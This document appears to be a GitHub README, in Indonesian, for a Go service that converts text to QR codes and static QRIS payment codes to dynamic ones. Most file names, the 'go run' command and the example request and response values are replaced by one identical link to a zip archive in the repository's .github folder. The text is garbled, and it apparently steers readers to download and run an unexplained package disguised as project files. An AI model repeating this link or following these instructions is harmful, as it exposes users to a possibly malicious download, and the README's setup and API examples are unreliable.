
# go-qr-qris

API Go untuk konversi QR ke string, string ke QR, dan QRIS statis ke dinamis. Menggunakan Fiber (web framework) dan zerolog (logging).

## Fitur
- Konversi string ke QR (base64 PNG)
- Konversi QR (base64 PNG) ke string
- Konversi QRIS statis ke dinamis (CRC16)

## Struktur Project

- `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip` (entrypoint utama di root)
- `.env` (opsional, untuk konfigurasi APP_NAME dan APP_PORT)
- `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip` (modul Go)
- `Dockerfile`, `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip`, `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip`

## Instalasi & Menjalankan

### Lokal
```bash
go mod tidy
go run https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip
```
Server berjalan di port default 3000, atau sesuai variabel `APP_PORT` di `.env`.

### Docker
```bash
docker build -t go-qr-qris .
docker run -p 3000:3000 --env-file .env go-qr-qris
```

### Docker Compose
```bash
docker compose up --build
```

## Konfigurasi

Bisa menggunakan file `.env`:
```
APP_NAME=go-qr-qris
APP_PORT=3123
```

## API

Semua endpoint berada di path:
```
/api/{APP_NAME}/v1
```
Contoh default: `/api/go-qr-qris/v1`

### 1. String ke QR
**POST /api/go-qr-qris/v1/string-to-qr**
Body:
```json
{
  "text": "Contoh QRIS 1234567890"
}
```
Response:
```json
{
  "qr_base64": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip png..."
}
```

### 2. QR ke String
**POST /api/go-qr-qris/v1/qr-to-string**
Body:
```json
{
  "qr_base64": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip png..."
}
```
Response:
```json
{
  "text": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip decode..."
}
```

### 3. QRIS Statis ke Dinamis
**POST /api/go-qr-qris/v1/qris-statis-to-dinamis**
Body:
```json
{
  "amount": "10000",
  "static_qris": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip qris statis..."
}
```
Response:
```json
{
  "dinamis_qris": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip dinamis...",
  "qr_base64": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip png..."
}
```

## CI/CD
Terdapat GitHub Action yang otomatis build dan push image ke Docker Hub setiap ada tag baru (v*).
Tambahkan secrets `DOCKERHUB_USERNAME` dan `DOCKERHUB_TOKEN` di repository.
